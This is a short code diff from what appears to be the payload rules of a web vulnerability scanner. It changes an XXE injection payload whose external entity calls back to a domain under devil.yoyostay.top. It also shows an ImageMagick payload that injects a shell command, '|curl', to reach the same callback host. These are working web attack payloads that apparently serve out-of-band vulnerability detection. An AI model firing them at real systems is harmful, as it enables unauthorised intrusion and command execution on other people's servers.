@@ -68,7 +68,7 @@ XSS_Rule = {
 }
 
 
-XXE_Role = '<?xml version="1.0" encoding="utf-8"?>\r\n<!DOCTYPE shinpachi8 [\r\n  <!ENTITY % dtd SYSTEM "http://xxe_{domain}.devil.yoyostay.top/">\r\n%dtd;]>\r\n<xxe>&shinpachi8ent;</xxe>\r\n'
+XXE_Role = '<?xml version="1.0" encoding="utf-8"?>\n\n<!DOCTYPE r [\n\n<!ENTITY r ANY>\n\n<!ENTITY sp SYSTEM "http://xxe_{domain}.devil.yoyostay.top/">\n\n]>\n\n<r>&sp;</r>'
 
 # imageMagick rules
 ImageMagick_Rule = 'push graphic-context\nviewbox 0 0 640 480\nimage copy 200,200 100,100 "|curl http://imagemagick_{domain}.devil.yoyostay.top"\npop graphic-context'
